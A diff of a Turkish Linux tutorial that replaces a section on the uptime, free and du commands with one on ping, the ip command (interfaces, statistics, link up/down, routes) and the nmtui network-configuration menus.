-Burada dikkat etmeniz gereken detay Linux'ta yük ortalamaları yalnızca CPU'lara değil, disk kaynaklarına olan talebi de yansıtıyor olması. Yani disk üzerindeki okuma yazma da sistem yükü ortalamasını etkiliyor. Elbette bu konu çok daha detayı barındırıyor ancak temel seviye için bu detaylar gerekli değil. Yine de daha fazla detay için [buradaki](https://www.brendangregg.com/blog/2017-08-08/linux-load-averages.html) blog yazısını okuyabilirsiniz.
-
-Özetleyecek olursak, eğer sizdeki çıktılarda sistem yükü benim ilk aldığım çıktıda olduğu gibi düşük veya 0 olarak gözüküyorsa, bu durum sisteminizin bu kısa periyotta genellikle beklemede olduğunun bilgisini veriyordur. Eğer yakın zaman aralığında artış görülüyorsa da bu sisteminizin gittikçe daha fazla yük altında kaldığına işaret ediyordur. 
-
-Eğer `uptime` komutundaki bu gibi detayları görmek istemezsek yani bu çıktı yerine yalnızca sistemin ne kadar süredir açık olduğunu daha okunaklı şekilde görmek istersek “**p**retty” ifadesinin kısalması olan `p` seçeneğini de kullanabiliriz. 
-
-```bash
-└─$ uptime -p                                                    
-up 31 minutes
-```
-
-Bakın yalnızca sistemin ne kadar süredir açık olduğunu daha güzel yani okunaklı şekilde bastırmış olduk.
-
-Eğer tarih olarak sistemin ne zaman başlatıldığını yani ilk açılış zamanı görmek istersek “**s**ince” ifadesinin kısaltması olan `s` seçeneğini kullanabiliyoruz. 
-
-```bash
-└─$ uptime -s
-2023-06-27 01:56:41
-```
-
-Bakın sistemin ne zaman başlatıldığı tam tarih ve saat olarak bastırılmış oldu.
-
-`uptime` komutu sistemin çalışma durumunu kontrol etmek için kullandığımız basit ama bilgi verici güzel bir araç. `uptime` hakkında bahsetmemiz gereken ekstra bir detay da bulunmuyor. Zaten yalnızca `-p` ve `-s` olmak üzere iki işlevsel seçeneği var. Unutmanız halinde yardım sayfasından seçeneklerin işlevlerini saniyeler içinde tekrar hatırlayabilirsiniz. Önemli olan `uptime` yani çalışma süresi komutunu biliyor olmanız. Zaten ismi de tam olarak işlevini tanımladığı için kolay kolay da unutmazsınız.
-
-## free Komutu
-
-`free` aracı, mevcut bellek kullanımı hakkında bilgi almak için kullandığımız bir araç. Herhangi bir seçenek olmadan doğrudan `free` komutunu kullandığımızda, mevcut bellek ve takas ile ilgili bilgileri kilobayt olarak konsola bastırıyor. 
-
-```bash
-└─$ free
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      803840     9596448        6652      544852     9884496
-Swap:         998396           0      998396
-```
-
-Bakın fiziksel ve takas alanı için sütunlar halinde pek çok detay bastırıldı. Zaten sütun başlıklarında buradaki miktarların tam olarak neyi temsil ettiği de açıkça belirtiliyor. Buradaki büyüklük birimleri kilobayt cinsinden. Eğer kilobayt yerine daha okunaklı şekilde çıktıları bastırmak istersek “**h**uman readable” ifadesinden gelen “**h**” seçeneğini kullanabiliriz. 
-
-```bash
-└─$ free -h
-               total        used        free      shared  buff/cache   available
-Mem:            10Gi       783Mi       9.2Gi       6.0Mi       532Mi       9.4Gi
-Swap:          974Mi          0B       974Mi
-```
-
-Tüm çıktılar çok daha okunaklı büyüklük birimleriyle bastırılmış oldu. 
-
-Neticede gördüğünüz gibi `free` komutu sayesinde toplam bellek ve takas alanı hakkında ve ayrıca anlık olarak kullanılan ve boştaki bellek miktarları hakkında kolayca bilgi alabiliyoruz. 
-
-Eğer tek seferliğine değil de belirli bir aralık belirterek bu istatistikleri görmek istersek `-s` seçeneği ile kaç saniyede bir bu değerlerin bastırılacağını da özel olarak belirtebiliriz. Ben denemek için `free -s 3` komutu ile 3 saniyelik aralık belirtiyorum. Biz durduruncaya kadar bu bilgiler 3 saniyede bir konsola bastırılacak. Durdurmak için <kbd>Ctrl</kbd> + <kbd>c</kbd> kısayolunu kullanabiliriz. 
-
-```bash
-└─$ free -s 3
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      798048     9602124        6652      544968     9890288
-Swap:         998396           0      998396
-
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      797536     9602628        6652      544976     9890800
-Swap:         998396           0      998396
-
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      797276     9602880        6652      544984     9891060
-Swap:         998396           0      998396
-
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      797524     9602628        6652      544988     9890812
-Swap:         998396           0      998396
-
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      797508     9602628        6652      545004     9890828
-Swap:         998396           0      998396
-
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ping www.google.com
+PING www.google.com (216.58.212.4) 56(84) bytes of data.
+64 bytes from www.google.com (216.58.212.4): icmp_seq=1 ttl=115 time=16.6 ms
+64 bytes from www.google.com (216.58.212.4): icmp_seq=2 ttl=115 time=17.5 ms
+64 bytes from www.google.com (216.58.212.4): icmp_seq=3 ttl=115 time=16.6 ms
+64 bytes from www.google.com (216.58.212.4): icmp_seq=4 ttl=115 time=17.3 ms
+64 bytes from www.google.com (216.58.212.4): icmp_seq=5 ttl=115 time=17.1 ms
 ^C
+--- www.google.com ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4009ms
+rtt min/avg/max/mdev = 16.638/17.020/17.450/0.330 ms
 ```
 
-Gördüğünüz gibi ben durduruncaya kadar 3 saniyede bir ilgili bilgileri konsona bastırmış oldu. 
+Çıktılara bakacak olursak, verdiğimiz www.google.com domain adresi çözümlenip “216.58.212.4” ip adresi bulunmuş ve bu adrese küçük bir data paketi gönderilmiş. Göndermiş olduğumuz pakete karşılık olarak da www.google.com adresi 64 byte’lık yanıt paketleri göndermiş. 
 
-Eğer istersek buradaki gibi yalnızca saniye aralığı belirtmek yerine basılma sayısını da tam olarak belirtebiliriz. Yani biz durdurana kadar değil bizim önceden belirttiğimiz sayı kadar çıktı basılır. Bunun için “**c**ount” yani “sayma” anlamındaki ifadenin kısaltmasından gelen `c` seçeneği kullanabiliriz. Ben `free -s 2 -c 4` komutu ile 2 saniye aralıkla 4 kez çıktıların bastırılmasını istiyorum.
+**icmp_seq** kısmı kaçıncı paket olduğunu belirtiyor, gördüğünüz gibi sıralı şekilde paketler ulaştığı için paket kaybı olmadığını anlayabiliyoruz. 
+
+**TTL**, “**t**ime **t**o **l**ive” yani “yaşam süresi” anlamına geliyor. Yanıt oluşturan sunucular pakete belirli sayıda bir TTL değeri atarlar. Bu değer, her bir yönlendirme işleminde 1 azaltılır. Bu sayede kaç yönlendirme yapıldığı bilinebilir. Ayrıca paketlerin döngüye girip sonsuza kadar yönlendirilerek ağ trafiği oluşturması da önlenmiş olur. TTL değerleri varsayılan olarak “64” “128” “255” gibi değerler tanımlanabiliyor. `ping` aracı üzerinden doğrudan sunucunun varsayılan TTL değerini bilemesek de aldığımız bu çıktıdan bu değerin 128 olduğunu tahmin edebiliyoruz. 
+
+**time** kısmı, bu yanıtın ne kadar sürede bize ulaştığını belirtir. Bu süre paketin gönderilip, yanıtın alınması sırasında geçen sürenin toplamdır. Bu sayede sunucu ile aramızdaki gecikmeyi öğrenebiliyoruz.
+
+Sondaki çıktılarda da genel istatistikler belirtilmiş. Zaten İngilizce olarak açıkça belirtildiği için 5 paketin iletildiği, 5 tanesinin hedefine ulaştığı, yüzde 0 paket kaybı olduğu ve ping işlemi sırasında geçen süreyi çıktılarda görebiliyoruz.
+
+Buradaki **RTT** ifadesi (**R**ound-**T**rip **T**ime), yani veri paketlerinin gönderilip geri dönme süresini ifade ediyor. Bu satırda, çıktılarda yer alan time değerlerinin en kısası, ortalaması, en uzunu ve ortalama sapma değeri ayrıca belirtiliyor. 
+
+`ping` aracının en temel kullanımı bu şekilde. Diğer seçeneklerini görmek için `ping —help` komutunu kullanabilirsiniz.
+
+Örneğin kaç adet paketin gönderileceğini belirtmek için `-c` seçeneği ile sayı belirtmemiz mümkün. Ben denemek için yalnızca **2** sayısını belirtiyorum.
 
 ```bash
-└─$ free -s 2 -c 4                                               
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      796648     9603428        6652      545064     9891684
-Swap:         998396           0      998396
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ping -c 2 www.linuxdersleri.net
+PING www.linuxdersleri.net (185.199.109.153) 56(84) bytes of data.
+64 bytes from www.linuxdersleri.net (185.199.109.153): icmp_seq=1 ttl=56 time=16.3 ms
+64 bytes from www.linuxdersleri.net (185.199.109.153): icmp_seq=2 ttl=56 time=15.6 ms
 
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      796896     9603176        6652      545068     9891436
-Swap:         998396           0      998396
-
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      797144     9602924        6652      545072     9891188
-Swap:         998396           0      998396
-
-               total        used        free      shared  buff/cache   available
-Mem:        10945140      797136     9602924        6652      545080     9891196
-Swap:         998396           0      998396
+--- www.linuxdersleri.net ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 15.550/15.922/16.295/0.372 ms
 ```
 
-2 saniye aralıkla yalnızca 4 kez bellek kullanımı hakkındaki son durum bastırılmış oldu.
+`ping` komutu varsayılan olarak ipv4 adresleri üzerinde çalışıyor. Eğer ipv6 adreslerle çalışacaksanız `-6` seçeneği ile bunu özellikle belirtmeniz gerekiyor. Elbette ipv6 adresleri üzerinde işlem yapıyorken, internet servis sağlayıcınızın da bu adreslere destek veriyor olması gerek.
 
-Bu seçenekler dışında `free` komutunun yardım sayfasında yer alan seçenekler de zaten standart kullanımdaki çıktıları sınırlamak veya genişletmek için kullanılan ek özelliklerdir. Dilerseniz buradaki seçenekler ile çıktıları istediğiniz formda bastırabilirsiniz.
+# ip Komutu
 
-Ayrıca aldığımıza çıktılarda yer alan “shared” sütunu eskiye dönük uyumluluk için mevcut olan ve günümüzde geçerli kullanımı olmayan bir sütun. Buffer ve cache kavramlarının ne ifade ettiğini bilmiyorsanız ayrıca araştırıp öğrenebilirsiniz. Tam anlaşılmaları bu bölümde tam olarak açıklanamayacak kadar uzun sürebileceği için bu araştırma işini size bırakıyorum. Eğer profesyonel anlamda sistem yönetimiyle ilgili değilseniz bu detay sizin için zaten önemli değil. Diğer sütunlardaki veriler de oldukça açık şekilde “toplam”, “kullanılan” ve “boştaki” bellek miktarları hakkında bilgi sunuyor.
-
-## du Komutu
-
-`du` komutu "**d**isk **u**sage" yani "disk kullanımı" ifadesinin kısaltmasından geliyor. Bu araç sayesinde dosyalar veya dizinler tarafından kullanılan tahmini disk alanını öğrenebiliyoruz. Büyük miktarda disk alanı kaplayan dosya ve dizinleri bulmak için kullandığımız pratik bir araç.
-
-`du` komutu herhangi bir seçenek veya argüman olmadan çalıştırıldığında, mevcut dizindeki ve alt dizinlerdeki tüm dosya ve klasörlerin disk kullanımını bayt cinsinden konsola bastırıyor. Ben şu an kendi ev dizinimdeyim. Denemek için yalnızca `du` yazıp komutumu onaylıyorum.
+`ip` komutu ağ arayüzleri hakkında bilgi almak ve yapılandırmak için kullanabildiğimiz çok kullanışlı bir araç. Aracımızın çok fazla seçeneği olduğu için öncelikle sahip olduğu seçenekleri görmek için yalnızca `ip` komutunu girelim.
 
 ```bash
-└─$ du
-4       ./.gnupg/private-keys-v1.d
-8       ./.gnupg
-8       ./.java/.userPrefs/burp
-12      ./.java/.userPrefs
-16      ./.java
-4       ./Templates
-4       ./linkler
-4       ./Music
-4       ./Videos
-4       ./yeni klasor
-4       ./yeni/y
-12      ./yeni
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ip
+Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
+       ip [ -force ] -batch filename
+where  OBJECT := { address | addrlabel | amt | fou | help | ila | ioam | l2tp |
+                   link | macsec | maddress | monitor | mptcp | mroute | mrule |
+                   neighbor | neighbour | netconf | netns | nexthop | ntable |
+                   ntbl | route | rule | sr | tap | tcpmetrics |
+                   token | tunnel | tuntap | vrf | xfrm }
+       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
+                    -h[uman-readable] | -iec | -j[son] | -p[retty] |
+                    -f[amily] { inet | inet6 | mpls | bridge | link } |
+                    -4 | -6 | -M | -B | -0 |
+                    -l[oops] { maximum-addr-flush-attempts } | -br[ief] |
+                    -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |
+                    -rc[vbuf] [size] | -n[etns] name | -N[umeric] | -a[ll] |
+                    -c[olor]}
+```
+
+Burada komutun temel kullanım şablonu açıklanmış. `ip` komutundan sonra ilgili seçeneği ve objeyi belirtebiliyoruz. Seçeneklerin ve objelerin yani aslında `ip` aracıyla yönetebileceğimiz nesnelerin hangileri olduğu da bu çıktılarda gözüküyor. 
+
+Sistemimize bağlı bulunan ağ arayüzleri hakkında bilgi almak için `ip a` ya da `ip addr` ya da uzun şekilde `ip address` şeklinde komutumuzu girebiliriz. 
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:95:bd:54 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.11/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
+       valid_lft 83519sec preferred_lft 83519sec
+    inet6 fe80::a00:27ff:fe95:bd54/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+```
+
+Eğer ağ arayüzleri tarafından gerçekleştirilen paket transferleri hakkında bilgi edinmek istersek `-s a` seçeneğini ekleyebiliriz. Buradaki `-s` seçeneği detaylı bilgi için istatistikleri(**s**tatistics) verirken, a(**a**ddress) parametresi, ağ arayüzlerini temsil etmek için ekleniyor. Bunun yerine `-s addr` `-s address` gibi uzun uzadıya yazmanız da mümkün.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ip -s a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+    RX:  bytes packets errors dropped  missed   mcast           
+             0       0      0       0       0       0 
+    TX:  bytes packets errors dropped carrier collsns           
+             0       0      0       0       0       0 
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:95:bd:54 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.11/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
+       valid_lft 85199sec preferred_lft 85199sec
+    inet6 fe80::f856:4192:4810:8e2c/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+    RX:  bytes packets errors dropped  missed   mcast           
+          3908      44      0       0       0      24 
+    TX:  bytes packets errors dropped carrier collsns           
+          3373      34      0       0       0       0
+```
+
+Buradaki çıktılarda yer alan “lo” ifadesi localhost ya da local loopback olarak bilinen ağ arayüzünü temsil ediyor. Bu arayüz, sayesinde mevcut cihazın kendi kendine ağ trafiği oluşturması ve işlemesi mümkün oluyor. Bu sayede örneğin bir websitesi geliştirirken gerçek ağ trafiği olmadan uygulamanın kendi içinde nasıl çalıştığını test edebiliyoruz. Ayrıca sistem üzerindeki pek çok araç da lokal adrese benzer sebeplerle ihtiyaç duyuyor.
+
+İkinci ağ arayüzü olan “eth0” ise ethernet bağlantısını temsil eden ağ arayüzüdür. Ben modemime ethernet kartıma bağlı olan kablo ile bağlı olduğum için ağ trafiğimi ethernet arayüzü üzerinden sağlıyorum. 
+
+Eğer sistemime Wi-Fi aygıtı bağlı olsaydı “wlan0” ağ arayüzünü de bu çıktılarda görüyor olacaktım. Bu durumu teyit etmek için sistemime Wifi adaptörünü bağladıktan sonra tekrar `ip a` komutunu giriyorum. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ip a                                                                                                                                                 
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:95:bd:54 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.15/24 brd 192.168.1.255 scope global noprefixroute eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::e1f0:e5b2:f52:f244/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+3: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
+    link/ether 5e:ba:fb:fb:58:23 brd ff:ff:ff:ff:ff:ff permaddr d4:6e:0e:02:0e:0d
+```
+
+Bakın bu kez wlan0 arayüzü de eklenmiş oldu. İsimlendirme sayesinde hangi tür ağ arayüzü olduğunu ve kaçıncı ağ arayüzü olduğunu da rahatlıkla görebiliyoruz. Tahmin edebileceğiniz gibi buradaki eth ve wlan ifadeleri arayüzü tipini belirtiyorken, bitişik şekilde yazılan sayılar ise kaçıncı ağ arayüzü olduğunu belirtiyor. Örneğin benim sistemimde 3 tane ethernet ağ kartı bağlı olsaydı buradaki çıktılarda “eth0”, “eth1” ve “eth2” şeklinde sırasıyla isimlendirilmiş ethernet arayüzlerini görecektik. 
+
+Ayrıca örneğin Rocky Linux üzerinde bu ağ arayüzü isimlendirmesi biraz daha farklı. Hemen görmek için `ip a` komutunu Rocky üzerinde girelim. 
+
+```bash
+[pc@linuxdersleri ~]$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:ce:11:be brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.12/24 brd 192.168.1.255 scope global dynamic noprefixroute enp0s3
+       valid_lft 85424sec preferred_lft 85424sec
+    inet6 fe80::a00:27ff:fece:11be/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+4: wlp0s11u1: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
+    link/ether 8e:ef:cc:44:7f:e2 brd ff:ff:ff:ff:ff:ff permaddr d4:6e:0e:02:0e:0d
+[pc@linuxdersleri ~]$
+```
+
+**Lokal adres** yine “**lo**” şeklinde belirtiliyorken, **ethernet** arayüzü “**enp0s3**” şeklinde isimlendirilmiş ve **wi-fi** arayüzü ise “**wlp0s11u1**” şeklinde isimlendirilmiş. Yine de çıktılara baktığımızda “**enp**” ile başlayanın **ethernet** arayüzünü, “**wlp**” ile başlayanın ise **wi-fi** arayüzünü temsil ettiğini ve bitişiğindeki ilk sayının ise kaçıncı ağ arayüzü olduğunu belirttiğini rahatlıkla anlayabiliyoruz. 
+
+Neticede `ip a` komutu sayesinde ağ arayüzleri hakkında gerekli olan temel bilgileri öğrenebiliyoruz.
+
+## Ağ Arayüzlerini Açıp Kapatmak | UP DOWN
+
+Dilersek bu ağ arayüzlerini kapatıp açmamız da mümkün. Üzerinde işlem yapmak istediğimiz arayüzü `ip link set` komutundan sonra yazıp, yapmak istediğimiz işlemi belirtebiliriz. Ben öncelikle **ethernet** arayüzünü kapatmak istiyorum. Bunun için `sudo ip link set eth0 down` komutunu giriyorum.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ sudo ip link set eth0 down
+[sudo] password for taylan: 
+
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ip address                                                                                                                          
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000
+    link/ether 08:00:27:95:bd:54 brd ff:ff:ff:ff:ff:ff
+```
+
+Gördüğünüz gibi **ethernet** bağlantısını temsil eden **eth0** arayüzünün **state** yani durumu **DOWN** olarak gözüküyor. 
+
+Şimdi kapatmış olduğumuz ağ arayüzünü tekrar aktifleştirmek üzere bu kez `up` seçeneğini kullanalım.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ sudo ip link set eth0 up
+
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ip address                                                                                                                                
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:95:bd:54 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.11/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
+       valid_lft 86398sec preferred_lft 86398sec
+    inet6 fe80::a00:27ff:fe95:bd54/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+```
+
+Bakın `sudo ip link set eth0 up` komutu sayesinde **eth0** arayüzünü tekrar **aktifleştirmiş** oldum.
+
+## Yönlendirici Adresini Öğrenmek | route
+
+Sistemin yönlendirme tablosu hakkında bilgi almak için `ip route` komutunu kullanabiliyoruz.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ ip route                                                                                                                                                
+default via 192.168.1.1 dev eth0 proto dhcp metric 100 
+192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.11 metric 100
+```
+
+Bu çıktılarda, **eth0** ağ arayüzünün **192.168.1.1** adresini **getway** olarak kullandığını belirtiyor. Ayrıca **192.168.1.0/24** adresinin **ağ adresi** olduğunu, **eth0** arayüzünün ise **192.168.1.11 ip adresine sahip** olduğu belirtiliyor. 
+
+Yani böylelikle 192.168.1.0/24 ağında 192.168.1.11 ip adresine sahip bir ethernet bağlantısına sahip olduğumu ve harici bir ağ ile iletişime geçmem gerektiğinde default getway olan 192.168.1.1 ip adresine sahip router ile iletişim kurulduğunu buradaki çıktılara bakarak anlayabiliyorum.
+
+Neticede `ip` aracı sayesinde ağ ve ağ arayülzeri hakkında gerekli olan pek çok bilgiye erişmemiz mümkün oluyor. Üstelik aslında `ip` aracını yalnızca bilgi almak için değil, bizzat ip ve route gibi bilgileri düzenlemek için de kullanabiliyoruz. Yani yeni ip adresleri veya yönlendirme(routing) bilgileri ekleyip kaldırmamız mümkün. **Fakat ip aracı ile gerçekleştirilecek olan bu değişiklikler sistem ya da ağ arayüzü yeniden başlatıldığında sıfırlanmış oluyor**. Bu sebeple kalıcı değişimler için alternatif araçlar tercih ediliyor. 
+
+Temelde `ip` aracının kullanımı bu şekilde. 
+
+# nmcli | nmtui
+
+`nmcli` ifadesi “**n**etwork **m**anager **c**ommand **l**ine **i**nterface” kısaltmasından geliyor. Ve ağ ile ilgili düzenlemeleri komut satırı üzerinden gerçekleştirebilmemizi sağlıyor. Ayrıca `nmtui` isimli alternatif sayesinde de yine komut satırı üzerinden ama bu kez görsel bir arayüzü bulunan araç ile temel ağ ayarlarını düzenlememiz mümkün oluyor. `nmtui` ifadesi “**n**etwork **m**anager **t**erminal **u**ser **i**nterface” ifadesinin kısaltmasından geliyor. Temel ağ konfigürasyonları için son derece yeterli ve kolay kullanılabilir olduğu için biz `nmtui` aracını ele alalım.
+
+Aracı çalıştırmak için konsola `nmtui` komutunu girelim.
+
+![nmtui.webp]({{ site.url }}/egitim/temel-linux/network/nmtui.webp){:class="responsive img-zoomable"}
+
+Araç ilk açıldığında “ağ konfigürasyonlarını düzenleme”, “ağ arayüzlerini aktifleştirme” ve sistemin “hostname bilgisini tanımlama” seçenekleri sunuyor. Öncelikle **ağ bağlantısını konfigüre etme** seçeneği ile devam edelim.
+
+![nmtui-connection.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-connection.webp){:class="responsive img-zoomable"}
+
+Burada bağlı olduğum ağ arayüzü gözüküyor. Benim sistemimde şu an yalnızca ethernet bağlı bulunduğu için yalnızca ethernet var. Eğer yeni bir bağlantı türü eklemek istersem, klavyemdeki yön tuşlarını kullanarak, sağ taraftaki **Add** seçeneğinin üstüne gelip <kbd>enter</kbd> ile onaylayabilirim. 
+
+![nmtui-connection-add.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-connection-add.webp){:class="responsive img-zoomable"}
+
+Buradaki listeden, hangi türde bağlantı tanımlanacaksa onu seçip gerekli konfigürasyonları gerçekleştirmemiz mümkün. Örneğin Wi-Fi bağlantısı gerçekleştirilecekse, bu seçenek seçilip, gerekli aygıt ve ağ bilgililerinin tanımlanması mümkün. 
+
+![nmtui-connection-add-wifi.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-connection-add-wifi.webp){:class="responsive img-zoomable"}
+
+Değişiklikleri kaydetmek için **OK** seçeneğinin üstüne gelip <kbd>enter</kbd> ile onaylamanız yeterli. Eğer değişiklikleri kaydetmek istemiyorsanız **Cancel** seçeneğini <kbd>enter</kbd> ile onaylayabilirsiniz. Ayrıca <kbd>esc</kbd> tuşu ile de değişiklikleri iptal edip bir önceki menüye hızlıca dönmeniz mümkün. 
+
+Yeni ağ bağlantısı tanımlamak yerine mevcut olan bağlantıyı konfigüre etmek istersek, ilgili bağlantının üstündeyken <kbd>enter</kbd> ile veya menüdeki **Edit** seçeneğine <kbd>enter</kbd> ile tıklayabiliriz. 
+
+![nmtui-connection-edit.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-connection-edit.webp){:class="responsive img-zoomable"}
+
+Düzenleme penceresi üzerinde, ilgili bağlantının türüne göre tanımlayabileceğimiz seçenekler gözüküyor. Örneğin ben ethernet bağlantısındaki IPv4 ip adreslerinin otomatik olarak alınması yerine kendim elle girmek istersem bu seçeneği değiştirmek üzere <kbd>enter</kbd> ile seçeneğe tıklayabilirim.
+
+![nmtui-connection-edit-ipv4.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-connection-edit-ipv4.webp){:class="responsive img-zoomable"}
+
+IP adresini elle girmek istediğim için “**Manual**” seçeneğini seçebilirim. Bu seçimin ardından konfigürasyon ayrıntıları için sağ taraftaki “**Show**” seçeneğine de tıklamamız gerek.
+
+![nmtui-connection-edit-ipv4-manual.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-connection-edit-ipv4-manual.webp){:class="responsive img-zoomable"}
+
+Artık buradan istediğim ip bilgilerini girmem mümkün. Bu değişimleri onaylamak için “**OK**” seçeneğinin üstüne gelip <kbd>enter</kbd> ile onaylamamız gerek. Daha sonra ağ arayüzünü kapatıp tekrar açtığımızda bu değişimler de gerçekleşmiş olacak. Ağ arayüzünü açıp kapatmak için de menüye dönüp buradan “**Activate a connection**” seçeneğine tıklamamız gerek.
+
+![nmtui-connection-activate.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-connection-activate.webp){:class="responsive img-zoomable"}
+
+Buradan ilgili bağlantıya <kbd>enter</kbd> ile tıkladığınızda aktif ise pasif, pasif ise aktif forma geçecektir. Yani buradan ilgili ağ arayüzünü açıp kapatmanız mümkün.
+
+![nmtui-connection-activate-on-off.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-connection-activate-on-off.webp){:class="responsive img-zoomable"}
+
+hostname bilgisini yani cihazın ağ üzerindeki ismini değiştirmek isterseniz ana menüden “**Set system hostname**” seçeneğine tıklayabilirsiniz.
+
+![nmtui-hostname.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-hostname.webp){:class="responsive img-zoomable"}
+
+Buradan dilediğiniz bir hostname bilgisi girip “**OK**” ile onaylayabilirsiniz. 
+
+<p class="sari"><strong>⚠️ Dikkat:</strong> Ben menüde yer aldığı için burada hostname değişiminden bahsediyorum fakat sizin şu an hostname bilgisini değiştirmenizi kesinlikle önermiyorum. Çünkü hostname değişimi için uygulanması gereken ek konfigürasyonlar da mevcut. İleride hostname konusundan ayrıca bahsettiğimizde daha bilinçli şekilde değişim yapabiliyor olacaksınız. Ben burada yalnızca bir alternatif olduğu için bu değişimden bahsediyorum fakat şimdilik siz hostname bilgisini değiştirmeyin. Aksi halde sistem yönetimi noktasında sorun yaşamanız kaçınılmaz olur.</p>
+
+![nmtui-hostname-set.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-hostname-set.webp){:class="responsive img-zoomable"}
+
+Bu noktada sizden yetkili olduğunuzu kanıtlamanız için parola bilgisi istenebilir. Değişim için parolanızı girin. 
+
+![nmtui-hostname-set-passwd.webp]({{ site.url }}/egitim/temel-linux/network/nmtui-hostname-set-passwd.webp){:class="responsive img-zoomable"}
+
